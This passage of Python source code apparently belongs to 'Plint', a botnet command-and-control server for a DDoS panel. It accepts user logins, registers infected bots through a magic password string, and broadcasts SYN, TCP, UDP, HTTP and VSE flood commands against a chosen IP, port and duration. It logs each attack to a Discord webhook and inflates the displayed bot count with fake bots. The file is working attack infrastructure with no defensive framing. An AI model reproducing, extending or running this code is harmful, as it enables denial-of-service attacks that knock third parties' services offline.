                                send(client, Fore.RED + 'Invalid port number (1-65535)')
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .vse ' + Fore.LIGHTCYAN_EX + '[IP] [PORT] [TIME]')

            elif command == '.LOOKUP':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 2:
                        ip = args[1]
                        if validate_ip(ip):
                            print('User: ' + username + ' LOOKUP | Lookup on: ', ip)
                            embed = DiscordEmbed(title='Lookup by ' + username, description="Lookup\nTarget: " + ip, color='03b2f8')
                            webhook.add_embed(embed)
                            response = webhook.execute(remove_embeds=True)
                            lookup = requests.get(f"http://ip-api.com/json/{ip}").text
                            send(client, GREEN + f'Lookup Result for {ip}:\n{lookup}')
                            with open('logs/logs.log', 'a') as f:
                                date = str(datetime.now().date())
                                time = str(datetime.now().time())
                                f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' Lookup | Lookup on: ' + ip)
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .lookup ' + Fore.LIGHTCYAN_EX + '[IP]')
         
            elif command == '.SYN':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 4:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        if validate_ip(ip):
                            if validate_port(port, True):
                                if validate_time(secs):
                                    with open('logs/logs.log', 'a') as f:
                                        date = str(datetime.now().date())
                                        time = str(datetime.now().time())
                                        f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' SYN | Attack on: ' + ip + ' Port: ' + port + ' seconds: ' + secs)
                                    print('User: ' + username + ' SYN | Attack on: ', ip, 'port: ', port, 'seconds: ', secs)
                                    embed = DiscordEmbed(title='Attack by ' + username, description="SYN\nTarget: " + ip + "\nPort: " + port + "\nTime: " + secs + f"\nBots: {len(bots) + fake_bot_count}", color='03b2f8')
                                    webhook.add_embed(embed)
                                    response = webhook.execute(remove_embeds=True)
                                    send(client, GREEN + f'Attack sent to {len(bots) + fake_bot_count} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                            else:
                                send(client, Fore.RED + 'Invalid port number (1-65535)')
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .syn ' + Fore.LIGHTCYAN_EX + '[IP] [PORT] [TIME]')
                        send(client, 'Use port 0 for random port mode')

            elif command == '.PING':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 2:
                        ip = args[1]
                        if validate_ip(ip):
                            response = os.system("ping -n 1 " + ip)
                            if response == 0:
                                online = "True"
                                send(client, f"{GREEN}{ip} is Up!")
                            else:
                                online = "False"
                                send(client, f"{Fore.RED}{ip} is Down!")
                            with open('logs/logs.log', 'a') as f:
                                date = str(datetime.now().date())
                                time = str(datetime.now().time())
                                f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' PING | Ping on: ' + ip + ' Online: ' + online)
                            print('User: ' + username + ' PING | Ping on: ', ip, ' Online: ', online)
                            embed = DiscordEmbed(title='Attack by ' + username, description="PING\nTarget: " + ip + "\nOnline: " + online, color='03b2f8')
                            webhook.add_embed(embed)
                            response = webhook.execute(remove_embeds=True)
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .ping ' + Fore.LIGHTCYAN_EX + '[IP]')
                    
            elif command == '.TCP':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 5:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        size = args[4]
                        if validate_ip(ip):
                            if validate_port(port):
                                if validate_time(secs):
                                    if validate_size(size):
                                        with open('logs/logs.log', 'a') as f:
                                            date = str(datetime.now().date())
                                            time = str(datetime.now().time())
                                            f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' TCP | Attack on: ' + ip + ' Port: ' + port + ' seconds: ' + secs + ' Size: ' + size)
                                        print('User: ' + username + ' TCP | Attack on: ', ip, 'port: ', port, 'seconds: ', secs, 'size: ', size)
                                        embed = DiscordEmbed(title='Attack by ' + username, description="TCP\nTarget: " + ip + "\nPort: " + port + "\nTime: " + secs + "\nSize: " + size + " Bytes" + f"\nBots: {len(bots) + fake_bot_count}", color='03b2f8')
                                        webhook.add_embed(embed)
                                        response = webhook.execute(remove_embeds=True)
                                        send(client, GREEN + f'Attack sent to {len(bots) + fake_bot_count} {"bots" if len(bots) != 1 else "bot"}')
                                        broadcast(data)
                                    else:
                                        send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                                else:
                                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                            else:
                                send(client, Fore.RED + 'Invalid port number (1-65535)')
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .tcp ' + Fore.LIGHTCYAN_EX + '[IP] [PORT] [TIME] [SIZE]')

            elif command == '.UDP':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 5:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        size = args[4]
                        if validate_ip(ip):
                            if validate_port(port, True):
                                if validate_time(secs):
                                    if validate_size(size):
                                        with open('logs/logs.log', 'a') as f:
                                            date = str(datetime.now().date())
                                            time = str(datetime.now().time())
                                            f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UDP | Attack on: ' + ip + ' Port: ' + port + ' seconds: ' + secs + ' Size: ' + size)
                                        print('User: ' + username + ' UDP | Attack on: ', ip, 'port: ', port, 'seconds: ', secs, 'size: ', size)
                                        embed = DiscordEmbed(title='Attack by ' + username, description="TCP\nTarget: " + ip + "\nPort: " + port + "\nTime: " + secs + "\nSize: " + size + " Bytes" + f"\nBots: {len(bots) + fake_bot_count}", color='03b2f8')
                                        webhook.add_embed(embed)
                                        response = webhook.execute(remove_embeds=True)
                                        send(client, GREEN + f'Attack sent to {len(bots) + fake_bot_count} {"bots" if len(bots) != 1 else "bot"}')
                                        broadcast(data)
                                    else:
                                        send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                                else:
                                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                            else:
                                send(client, Fore.RED + 'Invalid port number (1-65535)')
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .udp ' + Fore.LIGHTCYAN_EX + '[IP] [PORT] [TIME] [SIZE]')
                        send(client, 'Use port 0 for random port mode')

            elif command == '.HTTP':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 3:
                        ip = args[1]
                        secs = args[2]
                        if validate_ip(ip):
                            if validate_time(secs):
                                with open('logs/logs.log', 'a') as f:
                                    date = str(datetime.now().date())
                                    time = str(datetime.now().time())
                                    f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' HTTP | Attack on: ' + ip + ' seconds: ' + secs)
                                print('User: ' + username + ' HTTP | Attack on: ', ip, 'seconds: ', secs)
                                embed = DiscordEmbed(title='Attack by ' + username, description="HTTP\nTarget: " + ip + "\nTime: " + secs + f"\nBots: {len(bots) + fake_bot_count}", color='03b2f8')
                                webhook.add_embed(embed)
                                response = webhook.execute(remove_embeds=True)
                                send(client, GREEN + f'Attack sent to {len(bots) + fake_bot_count} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid IP-address')
                    else:
                        send(client, 'Usage: .http ' + Fore.LIGHTCYAN_EX + '[IP] [TIME]')
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    client_ip = client.getpeername()[0]
    
    send(client, f'\33]0;Plint | Login\a', False)
            

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTCYAN_EX}Username{Fore.LIGHTMAGENTA_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTCYAN_EX}Password{Fore.LIGHTMAGENTA_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
    
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)
        print(Fore.LIGHTCYAN_EX + '[CLIENT] ' + Fore.GREEN + '{}'.format(client.getpeername()[0]) + Fore.RESET + ' -> plint.onthewifi.com:101')
        if not find_login(username, password, client_ip):
            send(client, Fore.RED + 'Invalid credentials')
            client.close()
            return
    
    

        admin_list = ["0xYZ", "Sneak"]
        test_users = ["free"]
        with open('logs/logs.log', 'a') as f:
            date = str(datetime.now().date())
            time = str(datetime.now().time())
            f.write("\n" + "[" + date + " - " + time + "] [CLIENT] {}".format(client.getpeername()[0]) + " -> plint.onthewifi.com:101")
    
        
        all_clients.update({client: address})
        clients.append((username + ' : ' + password + ' : ' + client_ip))
        threading.Thread(target=update_title, args=(client, username, admin_list, test_users)).start()
        threading.Thread(target=command_line, args=[client, username, admin_list, test_users, clients, client_ip]).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        with open('logs/logs.log', 'a') as f:
            date = str(datetime.now().date())
            time = str(datetime.now().time())
            f.write("\n" + "[" + date + " - " + time + "] [BOT] {}".format(client.getpeername()[0]) + " -> plint.onthewifi.com:101")
    
        print(Fore.LIGHTCYAN_EX + '[BOT] ' + Fore.GREEN + '{}'.format(client.getpeername()[0]) + Fore.RESET + ' -> plint.onthewifi.com:101')
        bot_count.append((client_ip))
        bots.update({client: address})
    
def main():
    with open("key.txt", "r") as file:
        file1 = file.readlines()
        if key not in file1:
            print(Fore.RED + "Wrong Activation! Please generate a new activation Key!" + Fore.RESET)
            sys.exit(1)
        

    port = 101
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    message3 = ""
    with open("bots.txt", "r") as file:
        while boties := file.readline():
            message3 += Fore.LIGHTCYAN_EX + '[BOT] ' + Fore.GREEN + '{}'.format(boties.rstrip()) + Fore.RESET + ' -> plint.onthewifi.com:101\n'
            print(message3)

    threading.Thread(target=ping).start()
    

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
